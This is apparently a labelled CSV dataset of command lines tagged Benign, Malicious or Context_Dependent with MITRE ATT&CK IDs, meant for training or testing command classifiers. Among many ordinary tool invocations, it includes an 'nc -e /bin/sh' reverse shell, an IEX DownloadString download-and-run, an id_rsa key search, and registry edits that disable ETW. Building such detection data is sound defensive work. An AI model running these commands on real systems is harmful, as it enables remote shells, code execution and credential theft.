command,label,original_label,mitre_id
trivy repo path/to/local_repository_directory|remote_repository_URL,Benign,Benign,Benign
wikit topic,Benign,Benign,Benign
takeown /a /f path\to\file,Benign,Benign,Benign
3d-ascii-viewer --color path/to/model.obj,Benign,Benign,Benign
"echo ""$a"" | awk '{print tolower($0)}'",Benign,Benign,Benign
berks install,Benign,Benign,Benign
firebase serve,Benign,Benign,Benign
pnputil /add-driver oemXX.inf,Benign,Benign,Benign
assimp export input_file.stl output_file.obj,Benign,Benign,Benign
tldr [-p|--platform] linux rsh,Benign,Benign,Benign
ncmpcpp --current-song,Benign,Benign,Benign
gox url_1 url_2 ...,Benign,Benign,Benign
ytmdl [-h|--help],Benign,Benign,Benign
gmssl version,Benign,Benign,Benign
nicotine [-h|--help],Benign,Benign,Benign
wireplumber,Benign,Benign,Benign
"dunstify ""Title"" ""Message""",Benign,Benign,Benign
rsync -rtvpl /source/backup /destination,Benign,Benign,Benign
flexget -c path/to/config.yml execute --task task_name,Benign,Benign,Benign
Resolve-Path ~,Benign,Benign,Benign
pipx run --spec httpx-cli httpx http://www.github.com,Benign,Benign,Benign
git fsck --root,Benign,Benign,Benign
dstat --xxx,Malicious,Malicious,T1548
"tgpt [-c|--code] ""prompt""",Benign,Benign,Benign
gnome-software --details package,Benign,Benign,Benign
pip install [-f|--find-links] url|path/to/directory package,Benign,Benign,Benign
gitmoji --commit,Benign,Benign,Benign
"asterisk -r -x ""sip show peers""",Benign,Benign,Benign
find . -mtime 0 -print,Benign,Benign,Benign
electrum signmessage address message,Benign,Benign,Benign
supervisorctl update,Benign,Benign,Benign
docker [commit|container commit] container image:tag,Benign,Benign,Benign
netstat -an | grep :139,Context_Dependent,Synthetic,Synthetic
rhash path/to/file,Benign,Benign,Benign
/Library/LaunchDaemons/,Malicious,Malicious,T1543
pnmrotate angle path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
bup [-d|--bup-dir] path/to/repository index path/to/directory,Benign,Benign,Benign
prstat -s rss,Benign,Benign,Benign
nvcc path/to/source.cu [-o|--output-file] path/to/executable [-I|--include-path] path/to/includes [-L|--library-path] path/to/library [-l|--library] library_name,Benign,Benign,Benign
lldb -p pid,Benign,Benign,Benign
find . -size -10c -print,Benign,Benign,Benign
"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}",Malicious,Malicious,T1105
aws route53 list-resource-record-sets --hosted-zone-id zone_id,Benign,Benign,Benign
ResumeThread,Malicious,Malicious,T1055
gops memstats pid|addr,Benign,Benign,Benign
tidy path/to/file.html,Benign,Benign,Benign
find /usr -name filename.txt -print,Benign,Benign,Benign
onefetch [-T|--type] programming|markup|prose|data,Benign,Benign,Benign
CreateFileA to \\.\PHYSICALDRIVE0,Malicious,Malicious,T1680
sudo mitmdump [-m|--mode] dns,Benign,Benign,Benign
shotcut path/to/file1 path/to/file2 ...,Benign,Benign,Benign
find . -type d -exec chmod 500 {} \;,Benign,Benign,Benign
"find -name ""*.cpp""",Benign,Benign,Benign
tomb lock encrypted_directory.tomb -k encrypted_directory.tomb.key,Benign,Benign,Benign
helm repo [ls|list],Benign,Benign,Benign
procs --or PID|command|user 41 firefox,Benign,Benign,Benign
"find ~/junk -name ""*"" -exec ls -l {} \;",Benign,Benign,Benign
gh alias [ls|list],Benign,Benign,Benign
"ls -Al | grep ""^d"" | awk -F"" "" '{print $9}'",Benign,Benign,Benign
llvm-dis path/to/input.bc -o -,Benign,Benign,Benign
conda update [-n|--name] base conda,Benign,Benign,Benign
gau --from YYYYMM --to YYYYMM example.com,Benign,Benign,Benign
mokutil --set-verbosity true,Benign,Benign,Benign
phan --output-mode text|verbose|json|csv|codeclimate|checkstyle|pylint|html,Benign,Benign,Benign
gcloud config configurations create configuration_name,Benign,Benign,Benign
faker [-r|--repeat] number [-l|--lang] en_AU|en_US|... city -o path/to/file.txt,Benign,Benign,Benign
abduco -Ar name,Benign,Benign,Benign
pkcon search package,Benign,Benign,Benign
choco list --approved-only,Benign,Benign,Benign
"Start-Process -FilePath ""C:Program Files (x86)\Splashtop\Splashtop Remote\Server\$srserver_exe""",Malicious,Malicious,T1219
find /home/me/target_dir_1 -type d,Context_Dependent,Benign,Benign
prqlc watch path/to/directory,Benign,Benign,Benign
"daemon [-n|--name] ""name"" [-l|--errlog] path/to/file.log command",Benign,Benign,Benign
bind -l | grep /,Benign,Benign,Benign
gst-launch-1.0 videotestsrc ! pipewiresink mode=provide,Benign,Benign,Benign
python3 vol.py [-f|--filename] path\to\memory_dump_file windows.info,Benign,Benign,Benign
gcrane auth login registry [-u|--username] user [-p|--password] password,Benign,Benign,Benign
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f",Malicious,Malicious,T1112
yaourt -S package,Benign,Benign,Benign
history | tail,Context_Dependent,Benign,Benign
Exec,Malicious,Malicious,T1547
clamscan [-i|--infected],Benign,Benign,Benign
tlsx [-l|-list] path/to/hosts.txt [-ex|-expired] [-ss|-self-signed] [-mm|-mismatched] [-re|-revoked] [-un|-untrusted],Benign,Benign,Benign
"find . -mindepth 1 -print0|xargs -0 -I, mv , /tmp",Benign,Benign,Benign
command | nl,Benign,Benign,Benign
elasticsearch-node [-h|--help],Benign,Benign,Benign
hg clone remote_repository_source destination_path,Benign,Benign,Benign
"find . -name ""FILES.EXT""",Benign,Benign,Benign
devpod provider list-available,Benign,Benign,Benign
ls `pwd`/*,Benign,Benign,Benign
"$instance.Document.Application.ShellExecute($driveLetter+"":\document.lnk"","""",$driveLetter+"":\"",$null,0)",Malicious,Malicious,T1553
"ping -n ""host""",Benign,Benign,Benign
"arduino --install-boards ""arduino:sam""",Benign,Benign,Benign
git clean [-f|--force] -d,Benign,Benign,Benign
pipewire-pulse [-c|--config] path/to/pipewire-pulse.conf,Benign,Benign,Benign
"nettacker --ping-before-scan [-m|--modules] port_scan,subdomain_scan,waf_scan,... [-g|--ports] 80,443 [-i|--targets] owasp.org",Benign,Benign,Benign
strip [-d|--strip-debug] path/to/file.o,Benign,Benign,Benign
pbmclean path/to/image.pbm > path/to/output.pbm,Benign,Benign,Benign
parallel-lint -j processes path/to/directory,Benign,Benign,Benign
rar a path/to/archive_name.rar path/to/directory,Benign,Benign,Benign
"Get-Date -Format ""yyyy-MM-dd HH:mm:ss""",Benign,Benign,Benign
iw reg get,Benign,Benign,Benign
ohdear get-monitor --monitor-id monitor_id,Benign,Benign,Benign
lure [ar|addrepo] [-n|--name] repository_name --url repository_url,Benign,Benign,Benign
nikto -h http://10.0.0.5,Context_Dependent,Synthetic,Synthetic
paclog --package package_name,Benign,Benign,Benign
find . -perm -4000 -print,Benign,Benign,Benign
fscrypt unlock path/to/encrypted_directory,Benign,Benign,Benign
accelerate launch path/to/script.py --multi_gpu --num_machines 2,Benign,Benign,Benign
crash -h,Malicious,Malicious,T1548
uv pip list,Benign,Benign,Benign
var host='attacker.com';,Malicious,Malicious,T1059
ppmlabel -x pos_x -y pos_y [-t|-text] text path/to/input_file.ppm > path/to/output_file.ppm,Benign,Benign,Benign
rustup show active-toolchain,Benign,Benign,Benign
"zint --barcode code_type --data ""UTF-8 data"" --output path/to/file",Benign,Benign,Benign
afinfo --xml path/to/file,Benign,Benign,Benign
monop -r:path/to/assembly.dll [-d|--declared-only] Namespace.Path.To.Type,Benign,Benign,Benign
envsubst < path/to/input_file,Benign,Benign,Benign
"date ""+%Y-%m-%d""",Benign,Benign,Benign
head [-c|--bytes] count path/to/file,Benign,Benign,Benign
doas -u root /bin/sh,Malicious,Malicious,T1059
find . -type f -wholename \*.mbox -print0 | parallel -0 mv {} {.},Benign,Benign,Benign
yabai -m config window_shadow off,Benign,Benign,Benign
ImpersonateLoggedOnUser,Malicious,Malicious,T1134
"echo `echo ""Ho ho ho""` | od -c",Benign,Benign,Benign
sudo aide [-r|--report] reporterurl,Benign,Benign,Benign
exo compute block-storage create volume_name --snapshot snapshot_name|id [-z|--zone] zone,Benign,Benign,Benign
/System/Library/LaunchDaemons,Malicious,Malicious,T1053
gladtex path/to/input.htex -o path/to/output.html,Benign,Benign,Benign
systemctl list-timers,Benign,Benign,Benign
arch,Context_Dependent,Benign,Benign
sudo chcat +CategoryName path/to/file,Benign,Benign,Benign
sudo uinput -d /dev/input/eventX /dev/input/eventY ...,Benign,Benign,Benign
find / -nouser -print,Context_Dependent,Benign,Benign
adb shell input keyevent keycode,Benign,Benign,Benign
isosize path/to/file.iso,Benign,Benign,Benign
C:\Windows,Malicious,Malicious,T1053
salt '*' state.highstate,Benign,Benign,Benign
gpgv --keyring path/to/pubkey_or_keyring.gpg path/to/signature.asc path/to/data_file,Benign,Benign,Benign
restic init [-r|--repo] path/to/repository,Benign,Benign,Benign
"echo ""flag2"" > $flagPath2",Malicious,Malicious,T1137
syncthing --log-level info|warning|error|debug,Benign,Benign,Benign
streamlink --hls-live-restart example.com/stream best,Benign,Benign,Benign
generaldomaininfo -noninteractive -consoleoutput,Context_Dependent,Malicious,T1087
"cd ""`xsel`""",Benign,Benign,Benign
find $search_path -name id_rsa 2>/dev/null >> $output_file,Malicious,Malicious,T1552
lspci -s 00:18.3,Benign,Benign,Benign
gnmic [-a|--address] ip:port set --update-path path --update-value value,Benign,Benign,Benign
dwebp path/to/input.webp -bmp|-tiff|-pam|-ppm|-pgm|-yuv -o path/to/output,Benign,Benign,Benign
siege https://example.com,Benign,Benign,Benign
gcloud auth activate-service-account,Benign,Benign,Benign
cat ~/.psql_history 2>/dev/null,Context_Dependent,Synthetic,Synthetic
"qr --error-correction L|M|Q|H ""data""",Benign,Benign,Benign
nrm del registry,Benign,Benign,Benign
krdc remote_host,Benign,Benign,Benign
uuencode <(head -c 200 /dev/urandom | base64 | gzip),Benign,Benign,Benign
HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString,Context_Dependent,Malicious,T1012
patool create path/to/archive path/to/file_or_directory1 path/to/file_or_directory2 ...,Benign,Benign,Benign
fsck -f /dev/sdX,Benign,Benign,Benign
choose [-x|--exclusive] :2,Benign,Benign,Benign
"{if($user.$prop -like ""*password*"")",Malicious,Malicious,T1552
"join <(sort aa) <(sort bb) | sort -k1,1n",Benign,Benign,Benign
"ps aux | awk '{print $4""\t""$11}' | sort | uniq -c | awk '{print $2"" ""$1"" ""$3}' | sort -nr",Context_Dependent,Benign,Benign
sequelize db:migrate,Benign,Benign,Benign
at -c job_number,Benign,Benign,Benign
jar tvf path/to/file.jar,Benign,Benign,Benign
pstree -p [pid ...],Context_Dependent,Benign,Benign
sudo chown root /tmp/hello,Malicious,Malicious,T1548
"koji call build '""git+https://src.fedoraproject.org/rpms/vim.git#e847a50297a216229050bf4db3d06a139104e7cf""' \""target\"" --kwargs '{""opts"":{""arch_override"":""sw_64""}}'",Benign,Benign,Benign
cupsreject -r reason destination1 destination2 ...,Benign,Benign,Benign
$AuthenticationPackagesValues += $passwordFilterName,Malicious,Malicious,T1556
chcon [-r|--role] role filename,Benign,Benign,Benign
gradle build --offline,Benign,Benign,Benign
rubocop --show-cops,Benign,Benign,Benign
"echo ""Hello\nWorld!"" | pbmtext [-s|-space] 3 [-ls|-lspace] 10 > path/to/output.pbm",Benign,Benign,Benign
pct config 100 --current,Benign,Benign,Benign
astyle [-s|--indent=spaces=]number_of_spaces path/to/file,Benign,Benign,Benign
steamcmd +runscript script.txt,Benign,Benign,Benign
ppmtopj path/to/input.ppm > path/to/output.pj,Benign,Benign,Benign
%TEMP%\result2.dat,Malicious,Malicious,T1074
systemd-delta,Benign,Benign,Benign
espanso install package,Benign,Benign,Benign
lpass status,Benign,Benign,Benign
bwa index path/to/reference.fa,Benign,Benign,Benign
<format type='raw'/>,Malicious,Malicious,T1222
chsh -s $(which zsh),Benign,Benign,Benign
git log [-p|--patch] path/to/file_or_directory,Benign,Benign,Benign
command | sha1sum,Benign,Benign,Benign
bison path/to/file.y,Benign,Benign,Benign
bsub -q queue_name make all,Benign,Benign,Benign
nmap -sV -p 80 10.0.0.1,Context_Dependent,Synthetic,Synthetic
gcalcli --calendar calendar_name agenda,Benign,Benign,Benign
valet paths,Benign,Benign,Benign
"echo ""*** Log Group Created ***""",Malicious,Malicious,T1562
koboldcpp [-t|--threads] amount_of_threads,Benign,Benign,Benign
tcpdump -i wlan0 -c 100,Context_Dependent,Synthetic,Synthetic
chown `stat -c %U originalfile`:`stat -c %G originalfile` newfile,Benign,Benign,Benign
grep -i error /var/log/apache2/access.log,Context_Dependent,Synthetic,Synthetic
conan install .,Benign,Benign,Benign
find . -name '*.scm',Benign,Benign,Benign
"net group ""domain admins"" /domain",Context_Dependent,Malicious,T1069
ld --verbose | grep SEARCH_DIR | tr -s ' ;' \\012,Benign,Benign,Benign
"git ls-files | grep -P "".*(hpp|cpp)"" | xargs wc -l",Benign,Benign,Benign
idnits --year 2021 path/to/file.txt,Benign,Benign,Benign
imv path/to/image1.ext path/to/image2.ext ...,Benign,Benign,Benign
sudo lvchange [-k|--setactivationskip] y /dev/vg_name/lv_name,Benign,Benign,Benign
ouch compress path/to/file1 path/to/file2 ... path/to/archive.zip,Benign,Benign,Benign
ls -d !(*@(.c|.h)),Benign,Benign,Benign
wajig sizes,Benign,Benign,Benign
ssh -L 8080:localhost:80 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
ucmDccwCOMMethod,Malicious,Malicious,T1548
asar [p|pack] path/to/input_file_or_directory path/to/output_archive.asar,Benign,Benign,Benign
moe path/to/file,Benign,Benign,Benign
find /DIR -type f -print0 | tr -dc '\0' | wc -c,Benign,Benign,Benign
scan-build command command_arguments,Benign,Benign,Benign
"pkill -9 ""process_name""",Benign,Benign,Benign
pmount,Benign,Benign,Benign
pnmtorle [-a|-alpha] path/to/input.pnm > path/to/output.rle,Benign,Benign,Benign
netserver -p port,Benign,Benign,Benign
ybacklight d300,Benign,Benign,Benign
find /var/log/ -mmin +60,Benign,Benign,Benign
virtualboxvm --startvm name|uuid --dvd path\to\image_file,Benign,Benign,Benign
return $files,Context_Dependent,Malicious,T1005
fossa init,Benign,Benign,Benign
"find . -iname ""*.mov"" -printf ""%p %f\n""",Benign,Benign,Benign
cd /home/www && find . -type f -print0 | xargs -0 perl -i.bak -pe 's/subdomainA\.example\.com/subdomainB.example.com/g',Benign,Benign,Benign
figlet input_text,Benign,Benign,Benign
"find . -type f | sed 's/.*/""&""/' | xargs ls -E | awk '{ print $6,"" "",$7,"" "",$9 }' | sort | tail -1",Benign,Benign,Benign
copr-cli build repository path/to/spec_file,Benign,Benign,Benign
openfortivpn host:port,Benign,Benign,Benign
Enable-PnpDevice -InstanceId 'RETRIEVED USING Get-PnpDevice COMMAND' -Confirm:$False,Benign,Benign,Benign
swaplabel [-U|--uuid] new_uuid path/to/file,Benign,Benign,Benign
"Start-Process -FilePath ""C:\Temp\ExternalPayloads\PCHunter_free\$pchunter64_exe""",Context_Dependent,Malicious,T1057
"setfattr [-n|--name] user.attribute_name [-v|--value] ""value"" path/to/file",Benign,Benign,Benign
"grep [option] ""text string to search” directory-path",Benign,Benign,Benign
kwallet-query kdewallet [-l|--list-entries] [-f|--folder] folder_name,Benign,Benign,Benign
gawk '{print $5}' path/to/file,Benign,Benign,Benign
ccache gcc path/to/file.c,Benign,Benign,Benign
gst-launch-1.0 playbin uri=dvd://,Benign,Benign,Benign
envoy run --path path/to/directory task_name,Benign,Benign,Benign
dotnet tool list [-g|--global],Benign,Benign,Benign
"find ~/container -mindepth 3 -type f -execdir mv ""{}"" $(dirname ""{}"")/.. \;",Benign,Benign,Benign
kitty,Benign,Benign,Benign
paccapability nls|downloader|signatures,Benign,Benign,Benign
ppmtoxpm path/to/input_file.ppm > path/to/output_file.xpm,Benign,Benign,Benign
npm audit fix [-f|--force],Benign,Benign,Benign
"units ""meters / second"" ""inches / hour""",Benign,Benign,Benign
po4a-updatepo --help-format,Benign,Benign,Benign
diff path/to/old_file path/to/new_file,Benign,Benign,Benign
bat [-n|--number] path/to/file,Benign,Benign,Benign
strings texput.dvi,Context_Dependent,Malicious,T1005
strigger --set --primary_database_failure|primary_slurmdbd_failure|primary_slurmctld_acct_buffer_full|primary_slurmctld_failure|... [-p|--program] path/to/executable,Benign,Benign,Benign
mpv --sub-file=path/to/file,Benign,Benign,Benign
sed -i 's/STRING_TO_REPLACE/STRING_TO_REPLACE_IT/g' index.html,Benign,Benign,Benign
biber path/to/file.bcf [-D|--debug],Benign,Benign,Benign
/var/log/wtmp,Malicious,Malicious,T1070
getArch.py -target target -timeout seconds,Benign,Benign,Benign
zbarcam /dev/video_device,Benign,Benign,Benign
echo $(($(date +%s) / 60 / 60 / 24)),Benign,Benign,Benign
smbserver.py -hashes LMHASH:NTHASH sharename path/to/share,Benign,Benign,Benign
printenv HOME,Context_Dependent,Synthetic,Synthetic
"source ""`brew --prefix`/etc/grc.bashrc""",Benign,Benign,Benign
find / -type f ! -perm 777,Context_Dependent,Benign,Benign
sudo trace-cmd clear,Benign,Benign,Benign
calligrastage path/to/presentation,Benign,Benign,Benign
scrapy startproject project_name,Benign,Benign,Benign
"notify-send [-t|--expire-time] 5000 ""Test"" ""This is a test""",Benign,Benign,Benign
find . -type f -name tecmint.php,Benign,Benign,Benign
ksh -n path/to/script.ksh,Benign,Benign,Benign
gitlint --commits single_refspec_argument,Benign,Benign,Benign
steamos-chroot [-h|--help],Benign,Benign,Benign
gotelemetry off,Benign,Benign,Benign
rpm-ostree rollback [-r|--reboot],Benign,Benign,Benign
rbw unlock,Benign,Benign,Benign
find /var -regex '.*/tmp/.*[0-9]*.file',Benign,Benign,Benign
devcontainer exec command,Benign,Benign,Benign
b3sum [-c|--check] path/to/file.b3,Benign,Benign,Benign
qm [p|pending] vm_id,Benign,Benign,Benign
ng [b|build] --verbose,Benign,Benign,Benign
"set-itemproperty $RunOnceKey ""NextRun"" '$thing_to_execute ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'",Malicious,Malicious,T1547
module unload module_name,Benign,Benign,Benign
cdparanoia [-Q|--query],Benign,Benign,Benign
pnmtosgi path/to/input.pnm > path/to/output.sgi,Benign,Benign,Benign
fadvise [-h|--help],Benign,Benign,Benign
nc -e /bin/sh 10.10.10.10 4444,Malicious,Synthetic,Synthetic
user locale of (get system info),Context_Dependent,Malicious,T1614
"limine-entry-tool --add-uki ""kernel_name"" ""path/to/uki.efi""",Benign,Benign,Benign
choco outdated --user username --password password,Benign,Benign,Benign
sort path/to/file,Benign,Benign,Benign
"whatwaf --tor [-p|--payloads] 'payload1,payload2,...' [-u|--url] https://example.com",Benign,Benign,Benign
ac -dp username,Benign,Benign,Benign
az logicapp stop [-n|--name] name [-g|--resource-group] resource_group,Benign,Benign,Benign
calcurse-caldav --init=keep-local,Benign,Benign,Benign
find . -name '*bak' -exec rm -i {} \;,Benign,Benign,Benign
find . -type f -size +10000000 -print|xargs ls -ld|more,Benign,Benign,Benign
. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1 \nSyncInvoke {CMD},Malicious,Malicious,T1216
ibmcloud login -a api_endpoint,Benign,Benign,Benign
"echo ""GET https://example.com"" | vegeta attack -duration=30s | vegeta report",Benign,Benign,Benign
"'@ -OutputAssembly ""$executable_filepath""",Malicious,Malicious,T1036
nix flake init,Benign,Benign,Benign
wl-paste > path/to/file,Benign,Benign,Benign
i3status -h,Benign,Benign,Benign
kcadm.sh update realms/realm_name -f path/to/file.json,Benign,Benign,Benign
find . –type f -mmin -10,Benign,Benign,Benign
duplicacy add storage_name snapshot_id storage_url,Benign,Benign,Benign
gh completion,Benign,Benign,Benign
go run $input_file,Malicious,Malicious,T1027
color /?,Benign,Benign,Benign
authd,Malicious,Malicious,T1055
querymanifest.cgi,Malicious,Malicious,T1554
comm -23 <(command_which_generate_N|sort) <(command_which_generate_M|sort),Benign,Benign,Benign
npm ci --omit dev|optional|peer,Benign,Benign,Benign
blight set 50 [-r|--relative],Benign,Benign,Benign
ScreenConnect,Malicious,Malicious,T1219
sntpd,Benign,Benign,Benign
rpcclient [-U|--user] domain\username --pw-nt-hash ip_address,Benign,Benign,Benign
alembic history,Benign,Benign,Benign
twurl authorize [-c|--consumer-key] twitter_api_key [-s|--consumer-secret] twitter_api_secret,Benign,Benign,Benign
cgclassify -g cpu:student 1234,Benign,Benign,Benign
diff file1 file2 | grep ^[\>\<] | wc -l,Benign,Benign,Benign
sudo su,Benign,Benign,Benign
doctl [d|databases] [o|options] [v|versions] --engine pg|mysql|redis|mongodb,Benign,Benign,Benign
phpcbf path/to/directory --standard standard,Benign,Benign,Benign
git gui citool --nocommit,Benign,Benign,Benign
"find . -type f -name ""*.txt"" -exec sed 's/TZ/MALAWI/g' {} \;",Benign,Benign,Benign
ahost -t a|aaaa|u example.com,Benign,Benign,Benign
couchdb,Benign,Benign,Benign
checkupdates [-c|--change],Benign,Benign,Benign
"find /home -type f -name ""*.ext"" -print0 | while read -r -d ""$(printf ""\000"")"" -r path; do cat $path | tr -d '\r' > $path""_new""; done",Context_Dependent,Benign,Benign
gphoto2 --summary,Benign,Benign,Benign
git imerge continue --no-edit,Benign,Benign,Benign
guetzli input.png output.jpg,Benign,Benign,Benign
webpack app.js bundle.js,Benign,Benign,Benign
top -u abc -d 30 -b -n 10,Benign,Benign,Benign
http-prompt localhost:8000/api --auth username:password,Benign,Benign,Benign
pio device monitor [-b|--baud] 57600,Benign,Benign,Benign
sudo mkfs.fat -n volume_name /dev/sdXY,Benign,Benign,Benign
find /ghi /jkl -type f -name abc.def 2> /dev/null -exec ls {} \; -exec cat {} \;,Benign,Benign,Benign
find / -name composer.json,Context_Dependent,Benign,Benign
"New-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force",Malicious,Malicious,T1562
gh screensaver [-s|--saver] fireworks|life|marquee|pipes|pollock|starfield,Benign,Benign,Benign
ipaggmanip [-p|--prefix] 16 path/to/file,Benign,Benign,Benign
dart pub get,Benign,Benign,Benign
"electron-packager ""path/to/app"" ""app_name"" --platform=""linux"" --arch=""x64""",Benign,Benign,Benign
tail -20 /etc/motd,Context_Dependent,Synthetic,Synthetic
cidr divide 10.0.0.0/16 9,Benign,Benign,Benign
} else{,Malicious,Malicious,T1531
go build,Benign,Benign,Benign
openstack network delete network_id_or_name,Benign,Benign,Benign
"ipscan 192.168.0.1-254 -p 80,443,22",Benign,Benign,Benign
"docker inspect [-f|--format] '\{\{range $p, $conf := .NetworkSettings.Ports\}\} \{\{$p\}\} -> \{\{(index $conf 0).HostPort\}\} \{\{end\}\}' container",Context_Dependent,Benign,Benign
"file(""/path/to/input-file"")",Context_Dependent,Malicious,T1005
mamba list,Benign,Benign,Benign
authconfig --update --passalgo=algorithm,Benign,Benign,Benign
eselect repository add name rsync|git|mercurial|svn|... sync_uri,Benign,Benign,Benign
"printf "" %02d"" $(seq 1 30)",Benign,Benign,Benign
find /path/to/files -exec truncate.sh {} \;,Benign,Benign,Benign
exit 2,Benign,Benign,Benign
stegsnow -C -f 'path/to/message.txt' path/to/file.txt path/to/result.txt,Benign,Benign,Benign
paste --delimiter=\\n --serial *.txt,Benign,Benign,Benign
provlaunch.exe LOLBin,Malicious,Malicious,T1218
jhead -ft path/to/image.jpg,Benign,Benign,Benign
HKLM:\SOFTWARE\Microsoft\Cryptography\MachineGuid,Context_Dependent,Malicious,T1012
pnmtopalm path/to/file.pnm > path/to/file.palm,Benign,Benign,Benign
phar info -f path/to/phar_file,Benign,Benign,Benign
lpinfo -v,Benign,Benign,Benign
mitmproxy [-m|--mode] regular|transparent|socks5|...,Benign,Benign,Benign
zile,Benign,Benign,Benign
emond -c path/to/config_file,Benign,Benign,Benign
yj < file.hcl -cj,Benign,Benign,Benign
"pnmconvol -matrix=-1,3,-1 -normalize path/to/image.pnm > path/to/output.pnm",Benign,Benign,Benign
s3cmd mv s3://src_bucket/src_object s3://dst_bucket/dst_object,Benign,Benign,Benign
keytool -genkeypair -v -keystore path/to/file.keystore -alias key_name,Benign,Benign,Benign
net user administrator /domain,Context_Dependent,Malicious,T1087
xzless path/to/file,Benign,Benign,Benign
ispell -v,Benign,Benign,Benign
caffeine [-V|--version],Benign,Benign,Benign
ping6 host,Benign,Benign,Benign
uv run --with-requirements path/to/requirements.txt path/to/script.py,Benign,Benign,Benign
aws lightsail create-instances --instance-names name --availability-zone region --bundle-id nano_2_0 --blueprint-id blueprint_id,Benign,Benign,Benign
"sprio [-j|--jobs] job_id_1,job_id_2,...",Benign,Benign,Benign
smbcacls //server/share path/to/file --user username --workgroup workgroup,Benign,Benign,Benign
find ~ -size +10M,Benign,Benign,Benign
kdig -d @1.1.1.1 +https +tls-hostname=1dot1dot1dot1.cloudflare-dns.com example.com,Benign,Benign,Benign
pnmalias [-fo|-fonly] path/to/input.pnm > path/to/output.ppm,Benign,Benign,Benign
postcss path/to/file --syntax syntax,Benign,Benign,Benign
cal [-3|--three],Benign,Benign,Benign
fmt -999 /path/to/input-file,Context_Dependent,Malicious,T1005
aurman [-S|--sync] [-s|--search] keyword,Benign,Benign,Benign
touch $target_file_path,Malicious,Malicious,T1070
npm [ls|list] --json,Benign,Benign,Benign
find | perl -lne 'print quotemeta' | xargs ls -d,Benign,Benign,Benign
shuf path/to/file,Benign,Benign,Benign
mods --settings,Benign,Benign,Benign
minisign -Sm path/to/file,Benign,Benign,Benign
quarkus update,Benign,Benign,Benign
pip install --break-system-packages .,Malicious,Malicious,T1548
pamtopng [-t|-transparent] color path/to/image.pam > path/to/output.png,Benign,Benign,Benign
pwd | sed 's#.*/##',Benign,Benign,Benign
zle widget_name,Benign,Benign,Benign
chmod u+rw path/to/file_or_directory,Benign,Benign,Benign
patch.dll,Malicious,Malicious,T1036
jekyll clean,Benign,Benign,Benign
GetLastError,Malicious,Malicious,T1106
nmap -sV --script=vuln 10.0.0.1,Context_Dependent,Synthetic,Synthetic
tslint --project path/to/project_root,Benign,Benign,Benign
wl-copy --clear,Benign,Benign,Benign
mvn idea:workspace,Benign,Benign,Benign
wcurl [-o|--output] path/to/file https://example.com/index.html,Benign,Benign,Benign
"reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0",Malicious,Malicious,T1112
enscript path/to/input_file [-o|--output] path/to/output_file,Benign,Benign,Benign
git name-rev HEAD~1 HEAD~2 main,Benign,Benign,Benign
"nmap -p port1,port2,... ip_or_host1,ip_or_host2,...",Context_Dependent,Benign,Benign
git count --all,Benign,Benign,Benign
"echo {1..3} {a..c}{dir1,dir2,dir3}",Benign,Benign,Benign
GetFileInfo -d path/to/file,Benign,Benign,Benign
cs java --jvm jvm_name:jvm_version --setup,Benign,Benign,Benign
rails destroy controller Posts,Benign,Benign,Benign
secret-tool store --label=label key value,Benign,Benign,Benign
echo '/path/to/command' >/path/to/temp-dir/bin/rustc,Malicious,Malicious,T1059
lxc-top [-d|--delay] 5,Benign,Benign,Benign
